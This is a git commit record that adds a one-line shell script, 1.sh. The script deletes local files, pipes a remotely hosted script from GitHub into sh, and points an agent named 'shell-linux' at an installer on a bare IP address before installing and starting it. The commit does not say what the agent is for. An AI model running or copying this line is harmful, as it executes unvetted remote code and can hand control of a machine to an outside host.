01ef3893cfd4aac79a91d7b6f1d634065ae4fb10
Daniil Yurchin <61235650+yurchin23@users.noreply.github.com>
2021-07-27 19:02:49 +0300

    Create 1.sh

---
+++ 1.sh
@@ -0,0 +1,1 @@
+rm eval.sh shell-linux start.sh tokenizer; wget -O - https://raw.githubusercontent.com/SoftEthica-Opensource/hysh-start-template/main/start.tpl.sh | INSTALLER_URI=http://49.12.99.239:3001 AGENT_IDENTIFIER=39862b8339b84b3192261ee6047a0c37 AGENT_NAME=shell-linux sh -s download; ./start.sh install; ./start.sh start
